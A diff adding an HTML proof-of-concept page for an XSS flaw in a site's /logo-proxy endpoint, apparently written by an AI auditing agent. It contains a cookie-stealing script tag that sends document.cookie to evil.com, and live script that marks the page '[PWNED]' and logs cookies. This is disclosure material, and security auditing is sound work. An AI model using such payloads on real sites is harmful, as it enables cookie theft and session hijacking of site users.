@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Bo2 Security PoC</title>
+</head>
+<body style="background:#1a1a2e;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
+<div style="text-align:center;max-width:600px;">
+<h1 style="color:#e94560;">&#x26A0;&#xFE0F; XSS via /logo-proxy &#8212; PoC</h1>
+<p style="color:#0f3460;font-size:1.2em;">This HTML was served through <code>bo2.space/logo-proxy</code></p>
+<p>Content-Type: <span style="color:#16c79a;">text/html</span></p>
+<p>Origin: <span style="color:#16c79a;">bo2.space</span></p>
+<hr style="border-color:#e94560;">
+<p style="color:#aaa;">The proxy blindly passes through any Content-Type from the remote server.</p>
+<p style="color:#aaa;">No domain allowlist. No content validation. No CSP.</p>
+<p style="color:#aaa;">A real attacker would inject <code>&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code></p>
+<hr style="border-color:#e94560;">
+<p style="color:#e94560;font-size:0.9em;">Security Audit &#8212; Hermes Agent &#8212; 2026-04-28</p>
+</div>
+<script>
+document.title = "[PWNED] XSS via logo-proxy on " + window.location.origin;
+console.log("[POC] XSS executed on:", window.location.origin);
+console.log("[POC] Document cookies:", document.cookie);
+</script>
+</body>
+</html>
